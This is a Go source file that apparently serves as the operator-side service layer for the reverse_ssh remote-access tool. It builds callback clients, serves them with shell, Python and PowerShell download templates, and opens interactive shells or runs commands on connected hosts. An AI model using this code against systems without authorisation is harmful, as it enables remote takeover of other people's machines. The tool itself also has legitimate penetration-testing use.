package rssh

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/data"
	"github.com/NHAS/reverse_ssh/internal/server/users"
	"github.com/NHAS/reverse_ssh/internal/server/webserver"
	"golang.org/x/crypto/ssh"
)

type Service struct {
	buildMu sync.Mutex
}

type BuildResult struct {
	Result         string `json:"result"`
	ClientStableID string `json:"clientStableId"`
}

type Artifact struct {
	URLPath           string  `json:"urlPath"`
	CallbackAddress   string  `json:"callbackAddress"`
	FilePath          string  `json:"filePath"`
	LogLevel          string  `json:"logLevel"`
	GOOS              string  `json:"goos"`
	GOARCH            string  `json:"goarch"`
	GOARM             string  `json:"goarm"`
	FileType          string  `json:"fileType"`
	Hits              int     `json:"hits"`
	Version           string  `json:"version"`
	FileSizeMB        float64 `json:"fileSizeMb"`
	UseHostHeader     bool    `json:"useHostHeader"`
	WorkingDirectory  string  `json:"workingDirectory"`
	DownloadURL       string  `json:"downloadUrl"`
	TemplateShellURL  string  `json:"templateShellUrl"`
	TemplatePythonURL string  `json:"templatePythonUrl"`
	TemplatePS1URL    string  `json:"templatePs1Url"`
}

type InteractiveSession struct {
	channel ssh.Channel
}

type CommandExecution struct {
	Output   string `json:"output"`
	TimedOut bool   `json:"timedOut,omitempty"`
}

func NewService() *Service {
	return &Service{}
}

func (s *Service) CreateBuild(config webserver.BuildConfig) (BuildResult, error) {
	s.buildMu.Lock()
	defer s.buildMu.Unlock()
	result, err := webserver.Build(config)
	if err != nil {
		return BuildResult{}, err
	}

	return BuildResult{
		Result:         result,
		ClientStableID: webserver.LastBuiltClientStableID(),
	}, nil
}

func (s *Service) ListArtifacts() ([]Artifact, error) {
	files, err := data.ListDownloads("")
	if err != nil {
		return nil, err
	}

	keys := make([]string, 0, len(files))
	for key := range files {
		keys = append(keys, key)
	}
	sort.Strings(keys)

	result := make([]Artifact, 0, len(keys))
	for _, key := range keys {
		item := files[key]
		baseURL := "http://" + downloadBaseAddress(item.CallbackAddress) + "/" + key
		result = append(result, Artifact{
			URLPath:           item.UrlPath,
			CallbackAddress:   item.CallbackAddress,
			FilePath:          item.FilePath,
			LogLevel:          item.LogLevel,
			GOOS:              item.Goos,
			GOARCH:            item.Goarch,
			GOARM:             item.Goarm,
			FileType:          item.FileType,
			Hits:              item.Hits,
			Version:           item.Version,
			FileSizeMB:        item.FileSize,
			UseHostHeader:     item.UseHostHeader,
			WorkingDirectory:  item.WorkingDirectory,
			DownloadURL:       baseURL,
			TemplateShellURL:  baseURL + ".sh",
			TemplatePythonURL: baseURL + ".py",
			TemplatePS1URL:    baseURL + ".ps1",
		})
	}

	return result, nil
}

func (s *Service) GetArtifact(urlPath string) (Artifact, error) {
	artifacts, err := s.ListArtifacts()
	if err != nil {
		return Artifact{}, err
	}

	for _, artifact := range artifacts {
		if artifact.URLPath == urlPath {
			return artifact, nil
		}
	}

	return Artifact{}, fmt.Errorf("artifact not found")
}

func (s *Service) DeleteArtifact(urlPath string) error {
	return data.DeleteDownload(urlPath)
}

func (s *Service) KillConnection(connectionID string) error {
	client, ok := users.GetClientConnection(connectionID)
	if !ok || client == nil {
		return nil
	}

	_, _, err := client.SendRequest("kill", false, nil)
	return err
}

func (s *Service) OpenInteractiveSession(stableID string, cols, rows uint32, shell string) (*InteractiveSession, error) {
	client, ok := clientConnectionByStableID(stableID)
	if !ok {
		return nil, fmt.Errorf("host is not currently connected")
	}

	return s.openInteractiveSession(client, cols, rows, shell)
}

func (s *Service) OpenInteractiveSessionOnConnection(connectionID string, cols, rows uint32, shell string) (*InteractiveSession, error) {
	client, ok := users.GetClientConnection(connectionID)
	if !ok {
		return nil, fmt.Errorf("host is not currently connected")
	}

	return s.openInteractiveSession(client, cols, rows, shell)
}

func (s *Service) openInteractiveSession(client *ssh.ServerConn, cols, rows uint32, shell string) (*InteractiveSession, error) {
	if client == nil {
		return nil, fmt.Errorf("host is not currently connected")
	}

	channel, requests, err := client.OpenChannel("session", nil)
	if err != nil {
		return nil, err
	}

	ptyReq := internal.PtyReq{
		Term:    "xterm-256color",
		Columns: cols,
		Rows:    rows,
		Width:   cols,
		Height:  rows,
	}

	okReply, err := channel.SendRequest("pty-req", true, ssh.Marshal(ptyReq))
	if err != nil {
		channel.Close()
		return nil, err
	}
	if !okReply {
		channel.Close()
		return nil, fmt.Errorf("client refused pty request")
	}

	okReply, err = channel.SendRequest("shell", true, ssh.Marshal(internal.ShellStruct{Cmd: shell}))
	if err != nil {
		channel.Close()
		return nil, err
	}
	if !okReply {
		channel.Close()
		return nil, fmt.Errorf("client refused shell request")
	}

	go ssh.DiscardRequests(requests)

	return &InteractiveSession{channel: channel}, nil
}

func (s *Service) ExecuteCommandOnConnection(connectionID, command string, timeout time.Duration) (CommandExecution, error) {
	client, ok := users.GetClientConnection(connectionID)
	if !ok {
		return CommandExecution{}, fmt.Errorf("host is not currently connected")
	}

	return s.executeCommand(client, command, timeout)
}

func (s *Service) executeCommand(client *ssh.ServerConn, command string, timeout time.Duration) (CommandExecution, error) {
	if client == nil {
		return CommandExecution{}, fmt.Errorf("host is not currently connected")
	}

	command = strings.TrimSpace(command)
	if command == "" {
		return CommandExecution{}, fmt.Errorf("command is required")
	}
	if timeout <= 0 {
		timeout = 60 * time.Second
	}

	channel, requests, err := client.OpenChannel("session", nil)
	if err != nil {
		return CommandExecution{}, err
	}
	defer channel.Close()

	go ssh.DiscardRequests(requests)

	okReply, err := channel.SendRequest("exec", true, ssh.Marshal(internal.ShellStruct{Cmd: command}))
	if err != nil {
		return CommandExecution{}, err
	}
	if !okReply {
		return CommandExecution{}, fmt.Errorf("client refused exec request")
	}

	var output bytes.Buffer
	var stderr bytes.Buffer
	done := make(chan error, 1)
	go func() {
		var (
			stdoutErr error
			stderrErr error
			wg        sync.WaitGroup
		)

		wg.Add(2)
		go func() {
			defer wg.Done()
			_, stdoutErr = io.Copy(&output, channel)
			if stdoutErr == io.EOF {
				stdoutErr = nil
			}
		}()
		go func() {
			defer wg.Done()
			_, stderrErr = io.Copy(&stderr, channel.Stderr())
			if stderrErr == io.EOF {
				stderrErr = nil
			}
		}()
		wg.Wait()

		switch {
		case stdoutErr != nil:
			done <- stdoutErr
		case stderrErr != nil:
			done <- stderrErr
		default:
			if stderr.Len() > 0 {
				if output.Len() > 0 && !bytes.HasSuffix(output.Bytes(), []byte("\n")) {
					output.WriteByte('\n')
				}
				output.Write(stderr.Bytes())
			}
			done <- nil
		}
	}()

	timer := time.NewTimer(timeout)
	defer timer.Stop()

	select {
	case copyErr := <-done:
		return CommandExecution{Output: output.String()}, copyErr
	case <-timer.C:
		_ = channel.Close()
		return CommandExecution{
			Output:   output.String(),
			TimedOut: true,
		}, fmt.Errorf("command timed out after %s", timeout.Round(time.Second))
	}
}

func clientConnectionByStableID(stableID string) (*ssh.ServerConn, bool) {
	if client, ok := users.GetClientConnection(stableID); ok {
		return client, true
	}
	client, _, ok := users.GetClientConnectionByFingerprint(stableID)
	return client, ok
}

func (s *InteractiveSession) Read(p []byte) (int, error) {
	return s.channel.Read(p)
}

func (s *InteractiveSession) Write(p []byte) (int, error) {
	return s.channel.Write(p)
}

func (s *InteractiveSession) Resize(cols, rows uint32) error {
	payload := make([]byte, 16)
	binary.BigEndian.PutUint32(payload[0:4], cols)
	binary.BigEndian.PutUint32(payload[4:8], rows)
	binary.BigEndian.PutUint32(payload[8:12], cols)
	binary.BigEndian.PutUint32(payload[12:16], rows)

	_, err := s.channel.SendRequest("window-change", false, payload)
	return err
}

func (s *InteractiveSession) Close() error {
	return s.channel.Close()
}

func downloadBaseAddress(callbackAddress string) string {
	value := strings.TrimSpace(callbackAddress)
	if value == "" {
		return webserver.DefaultConnectBack
	}

	if strings.Contains(value, "://") {
		parsed, err := url.Parse(value)
		if err == nil && parsed.Host != "" {
			return parsed.Host
		}
		return webserver.DefaultConnectBack
	}

	return value
}
